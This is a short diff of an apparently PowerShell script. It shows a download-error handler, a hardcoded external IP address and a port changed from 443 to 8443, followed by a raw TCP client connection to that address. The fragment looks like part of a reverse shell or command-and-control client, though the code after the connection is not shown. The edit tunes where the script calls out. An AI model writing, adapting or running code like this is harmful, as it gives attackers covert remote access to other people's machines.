@@ -12,7 +12,7 @@ try {
     Write-Host "Download Error: $($_.Exception.Message)" -ForegroundColor Yellow
 }
 $ip = "89.108.79.197"
-$port = 443
+$port = 8443
 
 try {
     $t = New-Object System.Net.Sockets.TCPClient($ip, $port)
